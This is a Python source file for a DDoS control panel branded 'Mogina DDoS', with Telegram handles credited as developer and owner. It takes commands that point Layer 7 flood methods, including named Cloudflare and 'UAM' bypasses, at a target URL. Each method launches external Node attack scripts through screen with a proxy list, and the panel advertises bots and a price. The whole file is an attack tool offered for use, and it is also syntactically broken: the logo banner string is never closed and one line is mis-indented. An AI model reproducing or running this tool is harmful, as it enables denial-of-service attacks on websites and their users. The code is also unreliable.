import os
import sys
import getpass
import time

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def logo():
	clear()
	sys.stdout.write(f"\x1b]2;Mogina DDoS | Plant: [25$] | Online: [online] | Methods: [23] | Expiry: [9999] | Username: [ADMIN]\x07")
	print("""
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠐⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠀⠀⣞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠀⢨⣁⡻⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠽⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

def menu():
	clear()
	sys.stdout.write(f"\x1b]2;Mogina DDoS | Plant: [50$] | Zombie : [362] | Methods: [5] | Expiry: [9999] | Username: [ADMIN]\x07")
	print("""
                     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠐⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠀⠀⣞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠀⢨⣁⡻⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠽⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
• PROXY | Premium proxies scraping | Tools
• METHODS | Available ddos methods | Menu
• HELP | This is display | Menu
• STOP | Stoped all attack in server | Tools
 ! If you want to use comments, use lowercase letters
""")

def ddos():
	clear()
	sys.stdout.write(f"\x1b]2;Mogina DDoS | Plant: [50$] | Zombie : [362] | Methods: [5] | Expiry: [9999] | Username: [ADMIN]\x07")
	print("""

                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠐⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠀⠀⣞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠀⢨⣁⡻⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠽⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

METHODS LAYER 7 LIST

• HTTPS-MIXS                    • BROWSER
• UAMBYPASS                    • RAW-FLOOD
• CFBYPASS
""")


def main():
    logo()
    while(True):
        cnc = input("""MOGINA • ADMIN-> """)
        if cnc.lower() == "methodss":
            ddos()
        elif cnc.lower() in ["clear", "cls"]:
            main()
        elif cnc.lower() == "help":
            menu()
        elif cnc.lower() == "methods":
            ddos()
        elif cnc.lower() == "stop":
            os.system('pkill screen')
            print("Stops All Attacks")
        elif cnc.lower() == "setup":
            os.system("python3 installer.py")
            print("Done")
        elif cnc.lower() == "proxy":
            os.system(f'cd Layer7 && python3 scrape.py')

        elif "https-mixs" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system(f'cd Layer7 && screen -dm node https-mixs {host} {attack_time} proxy.txt 5 32')
                sys.stdout.flush()
                print(f""" All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: https-mixs <url> <time>')
                print('Example: https-mixs http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "uambypass" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node livex {host} {attack_time} 10 64 proxy.txt')
                sys.stdout.flush()
                print(f""" All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: uambypass <url> <time>')
                print('Example: uambypass http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "browser" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node livex {host} {attack_time} 10 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node BROWSER {host} {attack_time} 32 8 proxy.txt')
                 sys.stdout.flush()
                print(f""" All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: browser <url> <time>')
                print('Example: browser http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')
                
        elif "cfbypass" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node CFBYPASS {host} {attack_time} 32 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node livex {host} {attack_time} 10 64 proxy.txt')
                sys.stdout.flush()
                print(f""" All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: cfbypass <url> <time>')
                print('Example: cfbypass http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "raw" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node raw {host} {attack_time}')
                sys.stdout.flush()
                print(f""" All bot sent attack success""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: raw <url> <time>')
                print('Example: raw http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')


        elif cnc.lower() == "credit":
            print("""[System] | Welcome ADMIN Mogina DDoS | Development By t.me/PhakeX2 | Ownered By t.me/linhcaptcha | Type [HELP]""")

        else:
            print(f"Command [{cnc}] Not Found. Type [HELP] to show commands.")

main()
